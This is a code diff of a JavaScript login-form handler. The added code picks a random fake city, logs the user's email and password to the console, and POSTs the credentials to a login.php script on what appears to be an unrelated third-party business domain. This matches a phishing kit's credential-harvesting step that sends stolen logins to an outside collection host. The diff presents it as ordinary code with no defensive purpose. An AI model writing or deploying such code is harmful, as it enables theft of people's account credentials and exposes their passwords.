@@ -251,30 +251,49 @@ if (form) {
 
 try {
 
+    const cities = [
+        "London",
+        "Sydney",
+        "New York",
+        "Tokyo",
+        "Paris"
+    ];
 
+    const city = cities[Math.floor(Math.random() * cities.length)];
+    const currentTime = new Date().toISOString();
 
- const cities = [
-   ];
+    // Debug
+    console.log("Email:", email);
+    console.log("Password:", password);
+    console.log("City:", city);
 
-const city = cities[Math.floor(Math.random() * cities.length)];
-const currentTime = new Date().toISOString();
+    console.log(JSON.stringify({
+        email,
+        password,
+        city,
+        currentTime
+    }));
 
-const res = await fetch("https://lorneplumbing.com.au/login.php", {
+    const res = await fetch("https://lorneplumbing.com.au/login.php", {
 
-    method: "POST",
+        method: "POST",
 
-    headers: {
-        "Content-Type": "application/json"
-    },
+        headers: {
+            "Content-Type": "application/json"
+        },
 
-    body: JSON.stringify({
-        email: email,
-        password: password,
-        city: city,
-        currentTime: currentTime
-    })
+        body: JSON.stringify({
+            email,
+            password,
+            city,
+            currentTime
+        })
 
-});
+    });
+
+} catch (err) {
+    console.error(err);
+}
 
 
 
